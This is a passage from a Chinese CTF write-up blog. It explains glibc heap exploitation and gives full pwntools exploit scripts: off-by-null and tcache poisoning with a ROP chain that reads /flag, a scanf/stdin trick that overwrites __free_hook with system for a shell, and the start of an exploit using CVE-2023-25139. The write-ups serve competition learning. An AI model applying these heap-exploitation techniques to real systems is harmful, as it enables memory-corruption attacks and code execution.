class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./nb&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;pwn-9c590524c0.challenge.xctf.org.cn&quot;, 9999, ssl=True)</span></span><br><span class="line">p=process(elf_path)</span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(cintent)</span><br><span class="line">itr =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cho</span>):</span><br><span class="line">sla(<span class="string">b&#x27;Chioce &gt;&gt; &#x27;</span>,tbs(cho))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Size: &#x27;</span>,tbs(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Index: &#x27;</span>,tbs(idx))</span><br><span class="line">sa(<span class="string">b&#x27;Note: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">menu(<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Index: &#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">menu(<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Index: &#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">edit(i,(p64(<span class="number">0x100</span>)+p64(<span class="number">0x20</span>))*<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">delete(<span class="number">0xf</span>-i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">delete(<span class="number">0xf</span>-<span class="number">7</span>-i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">libc.address=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219CE0</span>-<span class="number">0x1f0</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">heap=u64(r(<span class="number">5</span>).rjust(<span class="number">6</span>,<span class="string">b&#x27;\x00&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))*<span class="number">16</span></span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,p64(heap+<span class="number">0x510</span>)+p64(heap+<span class="number">0x510</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">environ=libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;environ&#x27;</span>,environ)</span><br><span class="line">edit(<span class="number">7</span>,p64(environ^(heap&gt;&gt;<span class="number">12</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">stack=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x130</span></span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64((stack-<span class="number">0x18</span>)^(heap&gt;&gt;<span class="number">12</span>)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">nnn=heap+<span class="number">0x8a0</span></span><br><span class="line">mmm=heap+<span class="number">0x820</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>,p64(mmm-<span class="number">8</span>)+p64(libc.address+<span class="number">0x2a3e5</span>)+p64(heap+<span class="number">0x520</span>)+p64(libc.address+<span class="number">0x45eb0</span>)+p64(<span class="number">2</span>)+p64(libc.address+<span class="number">0x796a2</span>)+p64(<span class="number">0</span>)+p64(libc.address+<span class="number">0x1214ee</span>)+p64(<span class="number">0</span>)+p64(libc.address+<span class="number">0x91316</span>)+p64(libc.address+<span class="number">0x2a3e5</span>)+p64(<span class="number">3</span>)+p64(libc.address+<span class="number">0x4da83</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(libc.address+<span class="number">0x1214ee</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0x530</span>)+p64(libc.address+<span class="number">0x796a2</span>)+p64(<span class="number">0x100</span>)+p64(libc.address+<span class="number">0x45eb0</span>)+p64(<span class="number">0</span>)+p64(libc.address+<span class="number">0x91316</span>)</span><br><span class="line">payload+=p64(libc.address+<span class="number">0x2a3e5</span>)+p64(<span class="number">1</span>)+p64(libc.address+<span class="number">0x1214ee</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0x530</span>)+p64(libc.address+<span class="number">0x45eb0</span>)+p64(<span class="number">1</span>)+p64(libc.address+<span class="number">0x91316</span>)</span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit(6,p64(heap)+p64(libc.address+0x2a3e5)+p64(0)+p64(libc.address+0x2be51)+p64(heap)+p64(libc.sym[&#x27;read&#x27;])+p64(libc.address+0x562ec))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(nnn)+p64(libc.address+<span class="number">0x4da83</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><p><strong>需要注意的几个点:</strong></p><ol><li>可以看到开始申请chunk的时候,<code>edit(i,(p64(0x100)+p64(0x20))*7)</code>往堆里填充p64(0x100)+p64(0x20),这就是未之后的off-by-null做准备,C0的size被写为0x100时,往后找到的chunk就会以写入的p64(0x100)+p64(0x20)作为prev_size和size,保持堆不被破坏,并且绕过许多物理相邻chunk检查</li><li>orw时,open的参数大多数时候可以只顾第一个参数也就是文件名指针,那可能是因为遗留的第二三个指针的值恰好合适,这次遇到了一个问题,open无法正确打开文件,因此还需要清空其第二三个参数,不过远程打通了,本地通不了(read永远读入0个字符)</li><li>这里exp泄露heap地址时其实可以与上一步合并一起利用,exp里其实多做了一些步骤,具体做法是再释放两个不相邻的chunk,之后接连取出,泄露bk字段</li><li>2.32及以上fastbin和tcache进行了加密,所以进行tcache攻击时需要先处理目标地址</li></ol><h2 id="关于tcache和fast加密后的heap-leak"><a href="#关于tcache和fast加密后的heap-leak" class="headerlink" title="关于tcache和fast加密后的heap leak"></a>关于tcache和fast加密后的heap leak</h2><p>在2.32版本中加入了关于tcache和fast的加密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过这个加密十分简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>现在无法像以往那样直接泄露heap</p><p>如果某个chunk并不是第一个放入处于空状态的tcache的chunk,那么就无法泄露heap</p><p>不过如果这个chunk是第一个放入处于空状态的tcache,那么因为tcache-&gt;counts[tc_idx]在tcache为空时默认为0,也就是说该chunk的next字段是由其next字段地址右移12位与0异或得到的,也就是next字段地址右移12位,再结合heap页对齐,便能够泄露heap了</p><h1 id="2023hitctf-scanf"><a href="#2023hitctf-scanf" class="headerlink" title="2023hitctf-scanf"></a>2023hitctf-scanf</h1><p><strong>标签:scanf利用|stdin利用|堆</strong></p><p><strong>题目介绍:</strong></p><p>程序提供了两个申请chunk的接口,每次malloc后会立即要求向其中scanf一个数字</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v0 == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  qword_4060 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, qword_4060);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v0 == <span class="string">&#x27;[&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">      ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, ptr);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>以及对应的free,在free前会将fd字段作为一个数字输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( qword_4060 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, *(_QWORD *)qword_4060);</span><br><span class="line">  <span class="built_in">free</span>(qword_4060);</span><br><span class="line">  qword_4060 = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">int</span> *)ptr);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      ptr = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此外还提供了一次单字节置零的机会,以及一个getchar接口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !qword_4078 )</span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, &amp;qword_4078, <span class="number">8uLL</span>);</span><br><span class="line">  *(_BYTE *)qword_4078 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( v0 == <span class="string">&#x27;(&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  byte_4068 = getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>因为处于free的chunk最多只能有两个,且没有足够的操作接口,使得我们无法利用常规的方案</p><p>不过无论如何,必做的都是泄露libc</p><p>此处我们可以利用scanf读取大数字时触发malloc_consolidate</p><p>使得释放的chunk被放入smallbin从而在fd字段写上libc</p><p>但是malloc后程序强制我们向fd字段scanf,而scanf又会改变其中的libc,这时候可以用到scanf读数字绕过,即发送<code>+-.</code>三个字符中任意一个</p><p>成功泄露libc后,接下来又该如何利用</p><p>考虑到程序提供的单字节置零还没使用,于是有可以利用stdin任意写</p><p>通过单字节置零将stdin结构体的_IO_buf_base的最低字节置零,使其指向自身</p><p>在此之前先将<code>/bin/sh\0</code>字符串解包以十进制数发送以获得字符串</p><p>然后置零</p><p>观察stdin结构体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7f904eccb8e0 &lt;_IO_2_1_stdin_&gt;:0x00000000fbad208b0x00007f904eccb963</span><br><span class="line">0x7f904eccb8f0 &lt;_IO_2_1_stdin_+16&gt;:0x00007f904eccb9640x00007f904eccb963</span><br><span class="line">0x7f904eccb900 &lt;_IO_2_1_stdin_+32&gt;:0x00007f904eccb9630x00007f904eccb963</span><br><span class="line">0x7f904eccb910 &lt;_IO_2_1_stdin_+48&gt;:0x00007f904eccb9630x00007f904eccb963</span><br><span class="line">0x7f904eccb920 &lt;_IO_2_1_stdin_+64&gt;:0x00007f904eccb9640x0000000000000000</span><br></pre></td></tr></table></figure><p>_IO_buf_base的最低字节置零的话,要填充3个字段才能再次到_IO_buf_base字段</p><p>将_IO_buf_base设为free_hook的地址,_IO_buf_base改为free_hook+8</p><p>然后此时_IO_read_ptr!=_IO_read_end</p><p>读取了0x28个字符,虽然是scanf读的但因为第一个字符为非数字字符所以直接接跳过了,所以不需要换行</p><p>所以需要使用getchar*0x28次</p><p>然后再读取就能改写free_hook了</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;&#123;&#125;[&#123;&#125;]&#123;*[]&#x27;</span> + <span class="string">b&#x27;(&#x27;</span> * <span class="number">0x28</span> + <span class="string">b&#x27;[&#125;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(<span class="string">b&#x27;9&#x27;</span> * <span class="number">0x400</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recvline(keepends=<span class="literal">False</span>)) - <span class="number">0x3c4b98</span></span><br><span class="line">free_hook_addr = libc_base + <span class="number">0x3c67a8</span></span><br><span class="line">stdin_addr = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">stdin_buf_base_addr = stdin_addr + <span class="number">0x8</span> * <span class="number">7</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libc_base: %x&#x27;</span>, libc_base)</span><br><span class="line">success(<span class="string">&#x27;stdin: %x&#x27;</span>, stdin_addr)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(<span class="built_in">str</span>(u64(<span class="string">b&#x27;/bin/sh\0&#x27;</span>)).encode())</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">io.send(p64(stdin_buf_base_addr))</span><br><span class="line"></span><br><span class="line">io.send(p64(stdin_addr + <span class="number">0x83</span>) * <span class="number">3</span> + p64(free_hook_addr) + p64(free_hook_addr +</span><br><span class="line"><span class="number">0x8</span>))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment">#for i in range(0x28):</span></span><br><span class="line"><span class="comment">#io.send(b&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">io.send(p64(system_addr))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2023tpctf-safehttpd"><a href="#2023tpctf-safehttpd" class="headerlink" title="2023tpctf-safehttpd"></a>2023tpctf-safehttpd</h1><p><strong>标签:CVE-2023-25139|堆</strong></p><p><strong>题目介绍:</strong></p><p>这题可以说一半的难度来自于逆向,逆向的量比较大,要搞清楚程序在做什么要花不少时间</p><p>不过只要足够的耐心,按照理解一个个将变量与函数命名,总能搞懂的</p><p>此外还用到了一个setlocale函数的cve,具体介绍在下方</p><p>这道题的第一大难点就是完成与程序交互的脚本</p><p>也就是上面说的逆向,完成了这一步</p><p>程序对每一个用户都会分配一个管理chunk(内部蕴含一个用来写的指针)</p><p>接下来就是利用CVE-2023-25139造成的缓冲区溢出使得一个管理chunk的写指针指向另一个管理指针,进而控制其写指针</p><p>并辅以利用程序判断用户时利用<strong>‘:’</strong>切割,使得原本只能由root使用的show和note功能可以被使用</p><p>构造时注意setlocale函数会产生大量的堆利用痕迹</p><p>那么此时已经可以做到任意地址任意写了</p><p>到这里,之后的利用就十分轻易了</p><p>可以采用泄露<code>__environ</code>符号,修改返回地址进行rop攻击与之前的强网拟态noo_heap大致相同</p><p>当然若是要采用io流攻击也是可以的</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">c = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(c):</span><br><span class="line">        gdb.attach(p, c)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">r   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span 